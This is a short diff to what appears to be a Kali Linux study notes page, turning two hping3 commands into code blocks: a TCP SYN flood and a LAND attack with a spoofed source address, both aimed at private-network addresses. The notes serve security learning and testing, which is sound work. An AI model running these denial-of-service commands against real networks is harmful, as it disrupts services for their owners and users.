@@ -46,5 +46,11 @@ tags: cybersecurity, linux, kali-linux
 
 ## Network Security Testing Basics
 ### Using hping3 for flooding
-`sudo hping3 --flood -S -p 80 192.168.86.1`
+```bash
+sudo hping3 --flood -S -p 80 192.168.86.1
+```
+
 ### Using hping3 for a LAND attack
+```bash
+sudo hping3 -S -p 80 192.168.1.1 -a 192.168.1.1
+```
